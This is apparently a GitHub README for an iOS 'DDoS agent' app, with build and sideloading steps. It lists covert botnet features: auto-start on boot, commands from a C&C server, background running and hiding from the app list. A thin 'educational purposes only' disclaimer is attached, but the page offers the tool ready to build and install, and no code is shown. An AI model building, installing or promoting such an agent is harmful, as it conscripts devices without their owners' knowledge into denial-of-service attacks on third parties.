[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/nxtdzuia)
# DDOS iOS App

DDoS agent for iOS - Educational purposes only.

## Auto-Build with GitHub Actions

This repository automatically builds a working IPA file using GitHub Actions on macOS runners.

### How to Get the IPA

1. **Fork this repository** to your GitHub account
2. Go to **Actions** tab
3. Click **"Build iOS IPA"** workflow
4. Click **"Run workflow"** → **"Run workflow"**
5. Wait ~2-3 minutes for build to complete
6. Download **DDOS-IPA** artifact
7. Extract and install `DDOS.ipa` via TrollStore

### Manual Build (macOS only)

```bash
chmod +x build.sh
./build.sh
```

### Features

- Auto-starts on device boot
- Connects to C&C server for commands
- Runs in background
- Hidden from app list (SBAppTags)

### Files

- `DDOS.m` / `DDOS.mm` - Main logic
- `main.m` - App entry point
- `Info.plist` - App configuration
- `build.sh` - Build script
- `.github/workflows/build.yml` - Auto-build config

### Installation

Install via TrollStore, ESign, Sideloadly, or AltStore.

---

⚠️ **Disclaimer**: For educational purposes only. Do not use against targets without permission.
